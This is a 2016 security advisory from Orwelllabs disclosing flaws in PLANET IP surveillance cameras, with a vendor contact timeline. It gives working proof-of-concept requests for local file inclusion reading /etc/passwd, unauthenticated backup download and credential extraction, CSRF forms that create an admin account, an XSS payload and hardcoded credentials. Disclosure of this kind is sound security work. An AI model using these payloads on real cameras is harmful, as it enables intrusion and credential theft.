@@ -1,0 +1,235 @@
+                         _ _ _       _
+                        | | | |     | |
+  ___  _ ____      _____| | | | __ _| |__  ___
+ / _ \| '__\ \ /\ / / _ \ | | |/ _` | '_ \/ __|   	
+| (_) | |   \ V  V /  __/ | | | (_| | |_) \__ \
+ \___/|_|    \_/\_/ \___|_|_|_|\__,_|_.__/|___/
+		
+		Security Adivisory
+		   2016-04-06                 www.orwelllabs.com
+	        Twitter:@orwelllabs
+
+				mantra: ...not affect a product that is in scope for... AhHum!
+
+
+
+Overview
+========
+Technical Risk: high
+Likelihood of Exploitation: medium
+Credits: Discovered and researched by Orwelllabs
+CVE-Number: N/A
+DWF: Submited
+Adivisory URL:
+http://www.orwelllabs.com/2016/02/planet-ip-surveillance-camera-local.html
+[1]
+
+
+Issues
+=====
+I.   Local File Inclusion (42 vectors)
+II.  Arbitrary file read/Authentication bypass
+III. Sensitive information disclosure
+IV.  Cross-site request forgery
+V.   Reflected Cross-site scripting
+VI.  hardcoded credentials
+
+
+I. Local File Inclusion
+=======================
+* CLASS: External Control of File Name or Path [CWE-73]
+
+The Web Management interface of PLANET IP surveillance Cams models
+FW-ICA-2500,
+ICA-2250VT, ICA-4200V, ICA-4500V, ICA-3350V, ICA-5350V AND ICA-8350 and
+probably
+others is prone to Local File Include (LFI).
+
+
+PoC
+---
+The request bellow is generated when a new user is added, in this case
+we are adding the following administrative credential for the cam:
+"root:r00tx".
+
+GET /cgi-bin/admin/querylogin.cgi HTTP/1.1
+Host: {xxx.xxx.xxx.xxx}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101
+Firefox/42.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://
+{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=root&pwd=r00tx&grp=administrator&sgrp=ptz&action=add&redirect=asp%2Fuser.asp
+Cookie: ipcam_profile=1; tour_index=-1; IsHideStreamingStatus=yes
+Authorization: Basic YdRRtXW41YXRtad4=
+Connection: keep-alive
+If-Modified-Since: Mon, 08 Jul 2013 11:10:26 GMT
+
+
+If the value of the parameter "redirect" was changed to any system file
+will return the contents of that file, as shown below:
+http://
+{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=root&pwd=r00tx&grp=administrator&sgrp=ptz&action=add&redirect=/etc/passwd
+
+In this case will retrieved the content of /etc/passwd
+
+Vectors:
+-------
+There are a total of 42 vectors of LFI, the detailed results will be
+published in www.orwelllabs.com [1] soon.
+Basically all menus of the camera (shown below) to submit, add, modify and
+remove settings trigger the corresponding
+scripts to access resource that contains a parameter "redirect" which is
+also affected.
+
+[ ----------------------------]
+[ #1:  Network ---------------] -> 9
+[ #2:  Camera  ---------------] -> 3
+[ #3:  System  -------------- ] -> 2
+[ #4:  Video   -------------- ] -> 4
+[ #5:  Audio   -------------- ] -> 1
+[ #6:  User    -------------- ] -> 1
+[ #7:  Protocol ------------- ] -> 2
+[ #8:  E-Mail  -------------- ] -> 1
+[ #9:  Event Detection ------ ] -> 1
+[ #10: Storage -------------- ] -> 2
+[ #11: Continuous Recording - ] -> 1
+[ #12: Recording List ------- ] -> 0
+[ #13: Event Server --------- ] -> 11
+[ #14: Event Schedule ------- ] -> 4
+[ ----------+---------------  ]
+
+
+
+II. Arbitrary file read/Authentication bypass
+=============================================
+The camera offers a feature to perform the download settings via a backup
+file. However,
+(how acess control is not effective) this file remains accessible via the
+browser for an unauthenticated user.
+
+PoC
+---
+wget --no-check-certificate https://{xxx.xxx.xxx.xxx}/backup.tar.gz
+tar -xzvf backup.tar.gz
+cat tmp/sysConfig/sysenv.cfg|strings|fmt|cut -f8,9 -d" "
+
+It will return the credential to access the camera
+
+Through this vulnerability a user can also obtain the credential of the AP
+to which the camera is connected just parsing
+the file: 'tmp/sysConfig/extra.info'
+
+
+III. Sensitive information disclosure
+=====================================
+Using LFI vulnerability report, a user can obtain sensitive information
+such as username and password by reading the log file, as follows:
+
+{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=&pwd=&grp=&sgrp=&action=&redirect=/var/log/messages
+
+
+IV. Cross-site request forgery
+==============================
+Planet IP cams ICA-* are prone to Multple CSRF.
+
+PoC
+------
+
+- This will create a admin credential: root:r00tx
+
+<html>
+<!-- CSRF PoC - -->
+<body>
+<form action="http://
+{xxx.xxx.xxx.xxx}/setup.cgi?language=ie&adduser=root:r00tx:1">
+<input type="submit" value="Submit form" />
+</form>
+</body>
+</html>
+
+- ICA-5350V
+
+<html>
+<!-- CSRF PoC -->
+<body>
+<form action="http://
+{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=root&pwd=r00tx&grp=administrator&sgrp=ptz&action=add&redirect=asp%2Fuser.asp">
+<input type="submit" value="Submit form" />
+</form>
+</body>
+</html>
+
+- Del user root
+
+<html>
+<!-- CSRF PoC -->
+<body>
+<form action="http://
+{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=root&pwd=r00tx&grp=administrator&sgrp=ptz&action=remove&redirect=asp%2Fuser.asp">
+<input type="submit" value="Submit form" />
+</form>
+</body>
+</html>
+
+
+V. Cross-Site Scripting
+=======================
+Cams models ICA-* are prone to Multiple XSS
+
+POC
+-------
+http://{xxx.xxx.xxx.xxx}/setup.cgi?<script>alert("XSS")</script>
+
+this will pop-up the message XSS in the browser
+
+
+VI. hardcoded credentials
+=========================
+
+The credentials of web management can be found just viewing the source of
+page default_nets.htm:
+
+POC
+------
+https://{xxx.xxx.xxx.xxx}/default_nets.htm
+
+code:
+
+}
+
+function av_onload(){
+CheckMobileMode();
+util_SetUserInfo();
+Loadplay();
+watchdog();
+//alert("watchdog");
+}
+function Loadplay(){
+play("MasterUsr","MasterPwd","554",parseInt("99"),parseInt("99"),"1",parseInt("2"),parseInt("0"),"192.168.1.99","");
+}
+
+
+Vulnerable Packages
+===================
+ICA-2500
+ICA-2250VT
+ICA-4200V
+ICA-4500V
+ICA-3350V
+ICA-5350V
+ICA-8350
+
+
+
+Timeline
+========
+2015-10-02 - Issues discovered
+2015-11-30 - Vendor contacted (advisore sent)
+2015-12-16 - Vendor contacted (asking for feedback about reported issues)
+2015-12-17 - Vendor response (asking for more time to check issues)
+2015-12-21 - RD team replied: can't duplicate vulnerabilities....
+2016-01-13 - Vendor contacted (submitted evidence that the vulnerabilities
+persist and can be reproduced.)
+...and no news after that...
